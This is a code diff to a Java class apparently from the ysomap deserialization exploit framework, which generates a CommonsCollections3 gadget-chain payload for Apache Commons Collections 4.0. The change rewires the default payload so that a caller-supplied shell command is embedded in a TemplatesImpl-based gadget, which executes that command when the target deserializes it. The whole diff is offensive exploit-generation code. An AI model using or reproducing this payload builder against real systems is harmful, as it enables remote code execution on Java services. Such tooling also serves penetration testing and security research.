@@ -4,11 +4,11 @@ import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
-import ysomap.exception.GenerateErrorException;
-import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
+import ysomap.annotation.Require;
 import ysomap.gadget.ObjectGadget;
+import ysomap.gadget.bullet.Bullet;
 import ysomap.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
 import ysomap.util.Reflections;
 
@@ -20,8 +20,9 @@ import java.util.Queue;
  * @since 2020/2/18
  */
 @SuppressWarnings({"rawtypes","unchecked"})
-@Dependencies({"org.apache.commons:commons-collections4:4.0"})
 @Authors({ Authors.FROHOFF })
+@Require(bullets = {"TransformerBullet","TransformerWithTemplatesImplBullet","TransformerWithResponseBullet"})
+@Dependencies({"org.apache.commons:commons-collections4:4.0"})
 public class CommonsCollections3 extends CommonsCollections2 {
 
     @Override
@@ -42,14 +43,10 @@ public class CommonsCollections3 extends CommonsCollections2 {
     }
 
     @Override
-    public ObjectGadget getDefaultBullet(String command) {
-        return new TransformerWithTemplatesImplBullet(null, "4");
-    }
-
-    public static void main(String[] args) throws GenerateErrorException {
-        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, "4");
-        new PayloadTester(CommonsCollections3.class)
-                .setBullet(bullet)
-                .run();
+    public ObjectGadget getDefaultBullet(String command) throws Exception {
+        Bullet bullet = new TransformerWithTemplatesImplBullet();
+        bullet.set("args", command);
+        bullet.set("version","4");
+        return bullet;
     }
 }
